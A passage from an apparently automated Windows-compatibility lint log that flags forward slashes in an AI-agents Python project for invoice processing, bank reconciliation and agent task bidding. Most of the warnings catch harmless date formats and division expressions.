        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\financial_workflow.py",
        "warning": "Line 248: Forward slash in path - '%m/%d/%Y'",
        "timestamp": "2025-09-05T17:30:42.339356"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\financial_workflow.py",
        "warning": "Line 249: Forward slash in path - '%d/%m/%Y'",
        "timestamp": "2025-09-05T17:30:42.339371"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\financial_workflow.py",
        "warning": "Line 250: Forward slash in path - '%Y/%m/%d'",
        "timestamp": "2025-09-05T17:30:42.339385"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\financial_workflow.py",
        "warning": "Line 251: Forward slash in path - '%m/%d/%y'",
        "timestamp": "2025-09-05T17:30:42.339398"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\financial_workflow.py",
        "warning": "Line 252: Forward slash in path - '%d/%m/%y'",
        "timestamp": "2025-09-05T17:30:42.339409"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\financial_workflow.py",
        "warning": "Line 265: Forward slash in path - \".lower()\n        \n        # Check category keywords\n        category_scores = {}\n        for category, keywords in self.category_keywords.items():\n            score = sum(1 for keyword in keywords if keyword in text)\n            if score > 0:\n                category_scores[category] = score / len(keywords)\n        \n        if category_scores:\n            best_category = max(category_scores, key=category_scores.get)\n            confidence = category_scores[best_category]\n        else:\n            best_category = \"",
        "timestamp": "2025-09-05T17:30:42.339429"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\financial_workflow.py",
        "warning": "Line 301: Forward slash in path - \"\n        anomalies = []\n        \n        if not historical_data:\n            return anomalies\n        \n        try:\n            # Amount anomaly detection\n            amounts = [float(inv.total_amount) for inv in historical_data if inv.total_amount > 0]\n            if amounts:\n                mean_amount = np.mean(amounts)\n                std_amount = np.std(amounts)\n                \n                if std_amount > 0:\n                    z_score = abs(float(invoice.total_amount) - mean_amount) / std_amount\n                    if z_score > self.anomaly_threshold:\n                        anomalies.append(f\"",
        "timestamp": "2025-09-05T17:30:42.339463"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\financial_workflow.py",
        "warning": "Line 352: Forward slash in path - \"\n        anomalies = []\n        \n        if not historical_data:\n            return anomalies\n        \n        try:\n            # Amount anomaly detection\n            amounts = [abs(float(t.amount)) for t in historical_data]\n            if amounts:\n                mean_amount = np.mean(amounts)\n                std_amount = np.std(amounts)\n                \n                if std_amount > 0:\n                    z_score = abs(abs(float(transaction.amount)) - mean_amount) / std_amount\n                    if z_score > self.anomaly_threshold:\n                        anomalies.append(f\"",
        "timestamp": "2025-09-05T17:30:42.339519"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\financial_workflow.py",
        "warning": "Line 559: Forward slash in path - '])\n        reconciliation_rate = matched_count / total_transactions if total_transactions > 0 else 0\n        \n        reconciliation_results['",
        "timestamp": "2025-09-05T17:30:42.339693"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\financial_workflow.py",
        "warning": "Line 564: Forward slash in path - \"Reconciliation completed: {matched_count}/{total_transactions} \"",
        "timestamp": "2025-09-05T17:30:42.339720"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\financial_workflow.py",
        "warning": "Line 570: Forward slash in path - \"\n        score = 0.0\n        \n        # Amount matching (exact match gets full score)\n        if abs(transaction.amount) == invoice.total_amount:\n            score += 0.4\n        else:\n            # Partial score for close amounts\n            amount_diff = abs(abs(transaction.amount) - invoice.total_amount)\n            max_amount = max(abs(transaction.amount), invoice.total_amount)\n            if max_amount > 0:\n                amount_similarity = 1.0 - (amount_diff / max_amount)\n                score += 0.4 * max(0, amount_similarity)\n        \n        # Date matching\n        if invoice.invoice_date and transaction.date:\n            date_diff = abs((transaction.date - invoice.invoice_date).days)\n            if date_diff <= self.date_tolerance_days:\n                date_score = max(0, 1.0 - (date_diff / self.date_tolerance_days))\n                score += 0.3 * date_score\n        \n        # Description/vendor matching\n        transaction_desc = transaction.description.lower()\n        vendor_name = invoice.vendor_name.lower()\n        \n        if vendor_name in transaction_desc or any(word in transaction_desc for word in vendor_name.split()):\n            score += 0.3\n        \n        return min(1.0, score)\n\n\nclass FinancialWorkflowOrchestrator:\n    \"",
        "timestamp": "2025-09-05T17:30:42.339765"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\financial_workflow.py",
        "warning": "Line 839: Forward slash in path - ']) /\n                    max(1, self.processing_stats['",
        "timestamp": "2025-09-05T17:30:42.339983"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\financial_workflow.py",
        "warning": "Line 915: Forward slash in path - \"\n                INVOICE\n                From: Office Supplies Inc.\n                Invoice Number: INV-2024-001\n                Date: 01/15/2024\n                \n                Description: Office supplies and stationery\n                Amount: $245.50\n                \"",
        "timestamp": "2025-09-05T17:30:42.340090"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\financial_workflow.py",
        "warning": "Line 927: Forward slash in path - \"\n                Software License Invoice\n                Microsoft Corporation\n                Invoice: MS-2024-456\n                Date: 01/16/2024\n                \n                Office 365 Business License\n                Total: $1,200.00\n                \"",
        "timestamp": "2025-09-05T17:30:42.340129"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\invoice_processor.py",
        "warning": "Line 166: Forward slash in path - \"Extract structured data from Excel/CSV\"",
        "timestamp": "2025-09-05T17:30:42.340732"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\invoice_processor.py",
        "warning": "Line 181: Forward slash in path - \"Excel/CSV extraction failed: {e}\"",
        "timestamp": "2025-09-05T17:30:42.340758"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\invoice_processor.py",
        "warning": "Line 262: Forward slash in path - '(?:invoice\\s*)?date\\s*:?\\s*(\\d{1,2}[-/]\\d{1,2}[-/]\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.340831"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\invoice_processor.py",
        "warning": "Line 263: Forward slash in path - '(?:invoice\\s*)?date\\s*:?\\s*(\\d{2,4}[-/]\\d{1,2}[-/]\\d{1,2})'",
        "timestamp": "2025-09-05T17:30:42.340852"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\invoice_processor.py",
        "warning": "Line 264: Forward slash in path - '(\\d{1,2}/\\d{1,2}/\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.340867"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\invoice_processor.py",
        "warning": "Line 302: Forward slash in path - '^[0-9/\\-\\s]+$'",
        "timestamp": "2025-09-05T17:30:42.340915"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\invoice_processor.py",
        "warning": "Line 387: Forward slash in path - \"%m/%d/%Y\"",
        "timestamp": "2025-09-05T17:30:42.340995"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\invoice_processor.py",
        "warning": "Line 387: Forward slash in path - \"%m/%d/%y\"",
        "timestamp": "2025-09-05T17:30:42.341019"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\invoice_processor.py",
        "warning": "Line 388: Forward slash in path - \"%Y/%m/%d\"",
        "timestamp": "2025-09-05T17:30:42.341043"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\invoice_processor.py",
        "warning": "Line 388: Forward slash in path - \"%d/%m/%Y\"",
        "timestamp": "2025-09-05T17:30:42.341060"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\invoice_processor.py",
        "warning": "Line 661: Forward slash in path - \"\n        overall_accuracy = (\n            self.successful_extractions / max(1, self.processed_invoices)\n        )\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.341254"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\invoice_processor.py",
        "warning": "Line 675: Forward slash in path - \": (\n                    self.budget_tracker.anthropic_tokens_used / \n                    self.budget_tracker.anthropic_tokens_limit * 100\n                ),\n                \"",
        "timestamp": "2025-09-05T17:30:42.341298"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\invoice_processor.py",
        "warning": "Line 681: Forward slash in path - \": (\n                    self.budget_tracker.azure_requests_used / \n                    self.budget_tracker.azure_requests_limit * 100\n                )\n            }\n        }\n    \n    async def save_invoice_data(self, invoice_data: InvoiceData, output_format: str = \"",
        "timestamp": "2025-09-05T17:30:42.341329"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\coordination\\task_allocator.py",
        "warning": "Line 62: Forward slash in path - \"\n        # Higher quality and confidence, lower cost and time = better score\n        time_score = max(0, 1.0 - (self.estimated_time / 60.0))  # Normalize to hours\n        cost_score = max(0, 1.0 - (self.bid_amount / 100.0))  # Normalize to $100\n        \n        return (\n            self.quality_promise * 0.3 +\n            self.confidence * 0.3 +\n            time_score * 0.2 +\n            cost_score * 0.2\n        )\n\n\n@dataclass\nclass AgentReputation:\n    \"",
        "timestamp": "2025-09-05T17:30:42.341717"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\coordination\\task_allocator.py",
        "warning": "Line 91: Forward slash in path - \"\n        if self.total_tasks == 0:\n            return 1.0\n        return self.completed_tasks / self.total_tasks\n    \n    def update_performance(self, task_completed: bool, estimated_time: float, \n                          actual_time: float, estimated_cost: float, \n                          actual_cost: float, quality: float, domain: str):\n        \"",
        "timestamp": "2025-09-05T17:30:42.341747"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\coordination\\task_allocator.py",
        "warning": "Line 99: Forward slash in path - \"\n        self.total_tasks += 1\n        \n        if task_completed:\n            self.completed_tasks += 1\n            \n            # Update quality average\n            alpha = 0.1  # Learning rate\n            self.average_quality = (1 - alpha) * self.average_quality + alpha * quality\n            \n            # Update time accuracy\n            if estimated_time > 0:\n                time_accuracy = 1.0 - abs(actual_time - estimated_time) / estimated_time\n                time_accuracy = max(0, min(1, time_accuracy))\n                self.average_time_accuracy = (1 - alpha) * self.average_time_accuracy + alpha * time_accuracy\n            \n            # Update cost accuracy\n            if estimated_cost > 0:\n                cost_accuracy = 1.0 - abs(actual_cost - estimated_cost) / estimated_cost\n                cost_accuracy = max(0, min(1, cost_accuracy))\n                self.average_cost_accuracy = (1 - alpha) * self.average_cost_accuracy + alpha * cost_accuracy\n            \n            # Update specialization for domain\n            if domain in self.specializations:\n                self.specializations[domain] = (1 - alpha) * self.specializations[domain] + alpha * quality\n            else:\n                self.specializations[domain] = quality\n        else:\n            self.failed_tasks += 1\n        \n        # Update overall reliability score\n        self.reliability_score = (\n            self.success_rate * 0.4 +\n            self.average_quality * 0.3 +\n            self.average_time_accuracy * 0.15 +\n            self.average_cost_accuracy * 0.15\n        )\n        \n        self.last_updated = datetime.now()\n\n\n@dataclass\nclass AllocationTask:\n    \"",
        "timestamp": "2025-09-05T17:30:42.341777"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\coordination\\task_allocator.py",
        "warning": "Line 174: Forward slash in path - \"\n        base_value = task.priority * 100  # Base value in currency units\n        \n        # Adjust for urgency\n        if task.deadline:\n            time_left = (task.deadline - datetime.now()).total_seconds() / 3600  # hours\n            urgency_multiplier = max(0.5, min(2.0, 24 / max(1, time_left)))\n            base_value *= urgency_multiplier\n        \n        # Adjust for complexity (based on requirements)\n        complexity_multiplier = 1.0 + len(task.required_skills) * 0.2\n        base_value *= complexity_multiplier\n        \n        # Market conditions\n        base_value *= self.current_market_conditions[\"",
        "timestamp": "2025-09-05T17:30:42.341819"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\coordination\\task_allocator.py",
        "warning": "Line 222: Forward slash in path - \"\n        if not others:\n            return 0.5\n        \n        if lower_better:\n            better_count = sum(1 for x in others if x > value)\n        else:\n            better_count = sum(1 for x in others if x < value)\n        \n        return better_count / len(others)\n    \n    async def update_market_conditions(self, completed_tasks: List[AllocationTask]):\n        \"",
        "timestamp": "2025-09-05T17:30:42.341855"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\coordination\\task_allocator.py",
        "warning": "Line 234: Forward slash in path - \"\n        if not completed_tasks:\n            return\n        \n        # Calculate demand pressure\n        recent_tasks = [t for t in completed_tasks if t.completion_time and \n                       t.completion_time > datetime.now() - timedelta(hours=24)]\n        \n        if recent_tasks:\n            avg_time_to_completion = np.mean([\n                (t.completion_time - t.created_at).total_seconds() / 3600\n                for t in recent_tasks\n            ])\n            \n            # High demand if tasks are completing quickly (agents are eager)\n            if avg_time_to_completion < 2:  # Less than 2 hours\n                self.current_market_conditions[\"",
        "timestamp": "2025-09-05T17:30:42.341878"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\coordination\\task_allocator.py",
        "warning": "Line 272: Forward slash in path - \"\n        current_load = self.agent_loads.get(agent_id, 0)\n        capacity = self.agent_capacities.get(agent_id, 3)\n        return min(1.0, current_load / capacity)\n    \n    def get_load_balancing_bonus(self, agent_id: str) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.341912"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\coordination\\task_allocator.py",
        "warning": "Line 470: Forward slash in path - \"\n        \n        # Base estimates\n        base_time = 10.0  # Base 10 minutes\n        base_cost = 5.0   # Base $5\n        \n        # Adjust based on task complexity\n        complexity_factor = 1.0 + len(task.required_skills) * 0.3\n        estimated_time = base_time * complexity_factor\n        estimated_cost = base_cost * complexity_factor\n        \n        # Adjust based on agent specialization\n        domain_skill = reputation.specializations.get(task.domain, 0.5)\n        skill_factor = 2.0 - domain_skill  # Better skills = lower cost/time\n        estimated_time *= skill_factor\n        estimated_cost *= skill_factor\n        \n        # Adjust based on current load\n        load_factor = self.load_balancer.get_agent_load_factor(agent.name)\n        load_multiplier = 1.0 + (load_factor * 0.5)  # Higher load = higher cost\n        estimated_cost *= load_multiplier\n        \n        # Add some randomness for market dynamics\n        time_variance = np.random.uniform(0.8, 1.2)\n        cost_variance = np.random.uniform(0.9, 1.1)\n        \n        estimated_time *= time_variance\n        estimated_cost *= cost_variance\n        \n        # Calculate confidence and quality promise\n        confidence = min(1.0, reputation.reliability_score + domain_skill * 0.3)\n        quality_promise = min(1.0, domain_skill + reputation.average_quality * 0.5)\n        \n        # Determine bid type based on agent characteristics\n        if reputation.average_cost_accuracy > 0.8:\n            bid_type = BidType.COST_OPTIMIZED\n        elif reputation.average_quality > 0.8:\n            bid_type = BidType.QUALITY_OPTIMIZED\n        elif reputation.average_time_accuracy > 0.8:\n            bid_type = BidType.TIME_OPTIMIZED\n        else:\n            bid_type = BidType.BALANCED\n        \n        return TaskBid(\n            agent_id=agent.name,\n            task_id=task.task_id,\n            bid_amount=estimated_cost,\n            estimated_time=estimated_time,\n            confidence=confidence,\n            quality_promise=quality_promise,\n            bid_type=bid_type\n        )\n    \n    async def _select_winning_bid(self, task: AllocationTask, bids: List[TaskBid]) -> Optional[TaskBid]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.342076"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\coordination\\task_allocator.py",
        "warning": "Line 524: Forward slash in path - \"\n        if not bids:\n            return None\n        \n        # Calculate scores for each bid\n        bid_scores = []\n        \n        for bid in bids:\n            reputation = self.agent_reputations[bid.agent_id]\n            \n            # Reputation score\n            reputation_score = reputation.reliability_score\n            \n            # Cost score (lower cost = higher score)\n            max_cost = max(b.bid_amount for b in bids)\n            cost_score = 1.0 - (bid.bid_amount / max_cost) if max_cost > 0 else 1.0\n            \n            # Time score (lower time = higher score)\n            max_time = max(b.estimated_time for b in bids)\n            time_score = 1.0 - (bid.estimated_time / max_time) if max_time > 0 else 1.0\n            \n            # Quality score\n            quality_score = bid.quality_promise\n            \n            # Load balancing bonus\n            load_bonus = self.load_balancer.get_load_balancing_bonus(bid.agent_id)\n            \n            # Market competitiveness\n            competitiveness = await self.market_maker.evaluate_bid_competitiveness(bid, task, bids)\n            \n            # Overall score\n            overall_score = (\n                reputation_score * self.reputation_weight +\n                cost_score * self.cost_weight +\n                time_score * self.time_weight +\n                quality_score * self.quality_weight +\n                load_bonus +\n                competitiveness * 0.1\n            )\n            \n            bid_scores.append((bid, overall_score))\n        \n        # Sort by score and return winner\n        bid_scores.sort(key=lambda x: x[1], reverse=True)\n        winning_bid = bid_scores[0][0]\n        \n        logger.info(f\"",
        "timestamp": "2025-09-05T17:30:42.342115"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\coordination\\task_allocator.py",
        "warning": "Line 601: Forward slash in path - \"\n        task.status = TaskStatus.IN_PROGRESS\n        start_time = datetime.now()\n        \n        try:\n            agent = self.agents[bid.agent_id]\n            \n            # Execute task\n            result = await agent.process_task(task.description, task.requirements)\n            \n            # Task completed successfully\n            end_time = datetime.now()\n            actual_time = (end_time - start_time).total_seconds() / 60.0  # minutes\n            \n            # Assess quality (simplified - in practice would need domain-specific evaluation)\n            quality = await self._assess_task_quality(result, task)\n            \n            task.status = TaskStatus.COMPLETED\n            task.completion_time = end_time\n            task.actual_cost = bid.bid_amount  # Use bid amount as actual cost\n            task.actual_quality = quality\n            \n            # Update reputation\n            reputation = self.agent_reputations[bid.agent_id]\n            reputation.update_performance(\n                task_completed=True,\n                estimated_time=bid.estimated_time,\n                actual_time=actual_time,\n                estimated_cost=bid.bid_amount,\n                actual_cost=bid.bid_amount,\n                quality=quality,\n                domain=task.domain\n            )\n            \n            # Update load balancer\n            await self.load_balancer.complete_task(bid.agent_id, task.task_id)\n            \n            logger.info(f\"",
        "timestamp": "2025-09-05T17:30:42.342194"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\coordination\\task_allocator.py",
        "warning": "Line 724: Forward slash in path - \": completed_tasks / total_tasks if total_tasks > 0 else 0\n            },\n            \"",
        "timestamp": "2025-09-05T17:30:42.342273"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\coordination\\task_allocator.py",
        "warning": "Line 737: Forward slash in path - \"\n        optimizations = []\n        \n        # Analyze recent performance\n        completed_tasks = [t for t in self.tasks.values() if t.status == TaskStatus.COMPLETED]\n        \n        if len(completed_tasks) >= 10:\n            # Analyze cost prediction accuracy\n            cost_errors = []\n            time_errors = []\n            \n            for task in completed_tasks[-20:]:  # Last 20 tasks\n                if task.bids:\n                    winning_bid = next((b for b in task.bids if b.agent_id == task.allocated_agent), None)\n                    if winning_bid:\n                        # Cost accuracy (using bid amount vs actual cost)\n                        cost_error = abs(winning_bid.bid_amount - task.actual_cost) / winning_bid.bid_amount\n                        cost_errors.append(cost_error)\n                        \n                        # Time accuracy\n                        if task.completion_time and task.allocation_time:\n                            actual_time = (task.completion_time - task.allocation_time).total_seconds() / 60\n                            time_error = abs(winning_bid.estimated_time - actual_time) / winning_bid.estimated_time\n                            time_errors.append(time_error)\n            \n            # Adjust weights based on prediction accuracy\n            if cost_errors:\n                avg_cost_error = np.mean(cost_errors)\n                if avg_cost_error > 0.3:  # High cost prediction error\n                    self.cost_weight = max(0.1, self.cost_weight - 0.05)\n                    self.quality_weight = min(0.4, self.quality_weight + 0.03)\n                    optimizations.append(\"",
        "timestamp": "2025-09-05T17:30:42.342326"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 87: Forward slash in path - \"\n        return self.successes / max(1, self.attempts)\n    \n    @property\n    def average_accuracy(self) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.342760"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 97: Forward slash in path - \"\n        return self.total_processing_time / max(1, self.attempts)\n    \n    @property\n    def average_cost(self) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.342773"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 102: Forward slash in path - \"\n        return self.total_cost / max(1, self.attempts)\n\n\nclass RegexExtractor:\n    \"",
        "timestamp": "2025-09-05T17:30:42.342780"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 128: Forward slash in path - '(?:invoice\\s*)?date\\s*:?\\s*(\\d{1,2}[-/]\\d{1,2}[-/]\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.342799"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 129: Forward slash in path - '(\\d{1,2}/\\d{1,2}/\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.342806"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 130: Forward slash in path - '(\\d{2,4}[-/]\\d{1,2}[-/]\\d{1,2})'",
        "timestamp": "2025-09-05T17:30:42.342812"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 143: Forward slash in path - 'delivery\\s*date\\s*:?\\s*(\\d{1,2}[-/]\\d{1,2}[-/]\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.342823"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 144: Forward slash in path - 'ship\\s*by\\s*:?\\s*(\\d{1,2}[-/]\\d{1,2}[-/]\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.342832"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 162: Forward slash in path - 'date\\s*:?\\s*(\\d{1,2}[-/]\\d{1,2}[-/]\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.342848"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 163: Forward slash in path - '(\\d{1,2}/\\d{1,2}/\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.342855"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 177: Forward slash in path - 'statement\\s*period\\s*:?\\s*(\\d{1,2}[-/]\\d{1,2}[-/]\\d{2,4})\\s*(?:to|-)?\\s*(\\d{1,2}[-/]\\d{1,2}[-/]\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.342869"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 195: Forward slash in path - 'effective\\s*(?:date|as\\s*of)\\s*:?\\s*(\\d{1,2}[-/]\\d{1,2}[-/]\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.342886"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 196: Forward slash in path - 'dated\\s*(\\d{1,2}[-/]\\d{1,2}[-/]\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.342894"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 199: Forward slash in path - '(?:expires?|terminates?|ends?)\\s*(?:on)?\\s*(\\d{1,2}[-/]\\d{1,2}[-/]\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.342901"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 200: Forward slash in path - 'term\\s*ends?\\s*(\\d{1,2}[-/]\\d{1,2}[-/]\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.342908"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 209: Forward slash in path - '(?:for\\s*the\\s*period\\s*ending|period\\s*ended?|as\\s*of)\\s*(\\d{1,2}[-/]\\d{1,2}[-/]\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.342920"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 210: Forward slash in path - '(\\d{1,2}[-/]\\d{1,2}[-/]\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.342927"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 309: Forward slash in path - '(\\d{1,2})[-/](\\d{1,2})[-/](\\d{4})'",
        "timestamp": "2025-09-05T17:30:42.342990"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 309: Forward slash in path - '),  # MM/DD/YYYY -> YYYY-MM-DD\n            (r'",
        "timestamp": "2025-09-05T17:30:42.343001"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 310: Forward slash in path - '),  # YYYY/MM/DD -> YYYY-MM-DD\n            (r'",
        "timestamp": "2025-09-05T17:30:42.343011"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 311: Forward slash in path - ')  # MM/DD/YY -> 20YY-MM-DD\n        ]\n        \n        for pattern, replacement in date_patterns:\n            match = re.match(pattern, date_str)\n            if match:\n                return re.sub(pattern, replacement, date_str)\n        \n        return date_str  # Return original if no pattern matches\n\n\nclass PatternMatcher:\n    \"",
        "timestamp": "2025-09-05T17:30:42.343025"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
